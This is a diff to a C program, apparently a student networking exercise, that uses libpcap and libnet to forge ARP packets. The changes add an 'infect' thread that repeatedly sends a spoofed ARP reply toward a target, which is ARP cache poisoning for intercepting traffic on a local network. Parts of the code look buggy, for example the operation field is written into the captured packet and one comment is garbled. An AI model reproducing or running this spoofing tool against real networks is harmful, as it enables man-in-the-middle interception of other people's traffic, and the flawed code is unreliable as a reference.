@@ -1,10 +1,8 @@
 #include <pcap/pcap.h>
 #include <libnet.h>
-#include <netinet/in.h>
 #include <stdio.h>
 #include <string.h>
-#include <pcap.h>
-#include <arpa/inet.h>
+#include <pthread.h>
 
 struct libnet_arp_hdr_Saewook
 {
@@ -42,7 +40,28 @@ struct libnet_arp_hdr_Saewook
     uint8_t padding[18];
 };
 
+typedef struct tTHREAD
+{
+    pcap_t *handle; /* Session handle */
+    u_char *send_buf;
+    int size;
+}THREAD;
 
+void *infect(void *data)
+{
+    THREAD* PP = (THREAD*)data;
+    pcap_t *handle = PP -> handle;
+    u_char *send_buf =  PP -> send_buf;
+    int i;
+    for(i = 0; i < 5; i++)
+    {
+    pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
+    sleep(1);
+    }
+
+    printf("The End of Infect packet");
+    return 0;
+}
 
 int main(int argc, char **argv)
 
@@ -78,6 +97,7 @@ int main(int argc, char **argv)
 
       // eth_hdr setting place
       // Destination Mac address
+
       send_buf[0] = 0xFF;
       send_buf[1] = 0xFF;
       send_buf[2] = 0xFF;
@@ -124,7 +144,7 @@ int main(int argc, char **argv)
           arp_hdr -> target_HA[2] = 0x00; //send_buf[34]
           arp_hdr -> target_HA[3] = 0x00; //send_buf[35]
           arp_hdr -> target_HA[4] = 0x00; //send_buf[36]
-          arp_hdr -> target_HA[5] = 0x00; //send_buf[37]
+          arp_hdr -> target_HA[5] = 0x00; //se  nd_buf[37]
 
           uint32_t dst_ip_hex;
           dst_ip_hex = htonl(inet_addr(argv[2]));
@@ -133,10 +153,7 @@ int main(int argc, char **argv)
           arp_hdr -> target_ip[0] = htonl(dst_ip_hex);
           arp_hdr -> target_ip[1] = htons(dst_ip_hex);
 
-
-
           pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
-
 
           // ---- reply infection ---- //
 
@@ -147,24 +164,24 @@ int main(int argc, char **argv)
           //if(res == -1) break;
 
           struct libnet_ethernet_hdr *ehP = (struct libnet_ethernet_hdr *)p;
-                  send_buf[0] = ehP->ether_shost[0];
-                  send_buf[1] = ehP->ether_shost[1];
-                  send_buf[2] = ehP->ether_shost[2];
-                  send_buf[3] = ehP->ether_shost[3];
-                  send_buf[4] = ehP->ether_shost[4];
-                  send_buf[5] = ehP->ether_shost[5];
+          send_buf[0] = ehP->ether_shost[0];
+          send_buf[1] = ehP->ether_shost[1];
+          send_buf[2] = ehP->ether_shost[2];
+          send_buf[3] = ehP->ether_shost[3];
+          send_buf[4] = ehP->ether_shost[4];
+          send_buf[5] = ehP->ether_shost[5];
 
-                  send_buf[6] = ehP->ether_dhost[0];
-                  send_buf[7] = ehP->ether_dhost[1];
-                  send_buf[8] = ehP->ether_dhost[2];
-                  send_buf[9] = ehP->ether_dhost[3];
-                  send_buf[10] = ehP->ether_dhost[4];
-                  send_buf[11] = ehP->ether_dhost[5];
+          send_buf[6] = ehP->ether_dhost[0];
+          send_buf[7] = ehP->ether_dhost[1];
+          send_buf[8] = ehP->ether_dhost[2];
+          send_buf[9] = ehP->ether_dhost[3];
+          send_buf[10] = ehP->ether_dhost[4];
+          send_buf[11] = ehP->ether_dhost[5];
+
 
           struct libnet_arp_hdr_Saewook *ARP;
           ARP = (struct libnet_arp_hdr_Saewook*)(p + sizeof(*ehP));
           arp_hdr -> ar_op = ntohs((ARP -> ar_op) = ARPOP_REPLY);
-
 
           arp_hdr -> sender_HA[0] = send_buf[6];
           arp_hdr -> sender_HA[1] = send_buf[7];
@@ -173,7 +190,6 @@ int main(int argc, char **argv)
           arp_hdr -> sender_HA[4] = send_buf[10];
           arp_hdr -> sender_HA[5] = send_buf[11];
 
-
           arp_hdr -> target_HA[0] = ARP -> sender_HA[0];
           arp_hdr -> target_HA[1] = ARP -> sender_HA[1];
           arp_hdr -> target_HA[2] = ARP -> sender_HA[2];
@@ -181,28 +197,46 @@ int main(int argc, char **argv)
           arp_hdr -> target_HA[4] = ARP -> sender_HA[4];
           arp_hdr -> target_HA[5] = ARP -> sender_HA[5];
 
-          pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
+          //-- reply packet to gateway --//
 
 
+          pthread_t thread_t[2];
+          THREAD st;
+          st.handle = handle;
+          st.send_buf = (u_char*)send_buf;
+          st.size = (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook));
 
+          int status;
+          int tid;
 
-
-
-        /*
-          if(eth_hdr -> ether_type = htons(ETHERTYPE_ARP) && arp_hdr -> ar_op = htons(ARPOP_REPLY))
+          tid = pthread_create(&thread_t[0], NULL, infect, (void *)&st);
+          if(tid < 0)
           {
-              arp_hdr -> sender_HA[0] = send_buf[6]; //send_buf[22]
-              arp_hdr -> sender_HA[1] = send_buf[7]; //send_buf[23]
-              arp_hdr -> sender_HA[2] = send_buf[8]; //send_buf[24]
-              arp_hdr -> sender_HA[3] = send_buf[9]; //send_buf[25]
-              arp_hdr -> sender_HA[4] = send_buf[10]; //send_buf[26]
-              arp_hdr -> sender_HA[5] = send_buf[11]; //send_buf[27]
+              printf("Can't Create Thread...!!");
+              exit(0);
+          }
+          pthread_join(thread_t[0], (void **)&status);
 
-              arp_hdr -> sender_ip[0] = htonl(dst_ip_hex);
-              arp_hdr -> sender_ip[1] = htons(dst_ip_hex);
-          }*/
+          printf("\n                  ** eth0 **\n");
+          printf("      Source MAC     ->  Destination MAC\n");
+          printf("   %02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X\n\n\n",
+                                                ehP->ether_shost[0],
+                                                ehP->ether_shost[1],
+                                                ehP->ether_shost[2],
+                                                ehP->ether_shost[3],
+                                                ehP->ether_shost[4],
+                                                ehP->ether_shost[5],
+                                                ehP->ether_dhost[0],
+                                                ehP->ether_dhost[1],
+                                                ehP->ether_dhost[2],
+                                                ehP->ether_dhost[3],
+                                                ehP->ether_dhost[4],
+                                                ehP->ether_dhost[5]);
 
+          //tid = pthread_create(&thread_t[1], NULL, reply, (void *)&st);
+          //pthread_join(thread_t[1], (void **)&status);
           return 0;
 
 }
+
 
